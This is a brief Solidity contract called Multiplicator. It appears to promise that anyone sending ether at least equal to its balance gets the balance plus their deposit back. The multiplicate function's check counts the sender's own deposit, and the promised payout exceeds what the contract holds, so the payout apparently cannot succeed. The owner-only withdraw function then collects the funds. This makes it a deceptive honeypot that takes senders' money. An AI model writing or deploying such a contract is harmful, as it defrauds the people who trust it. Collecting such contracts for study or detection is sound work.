pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function withdraw()
    payable
    public
    {
        _WithdrawHandler(msg.sender);
    }

    function _WithdrawHandler(address _sender) internal {
        require(_sender == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}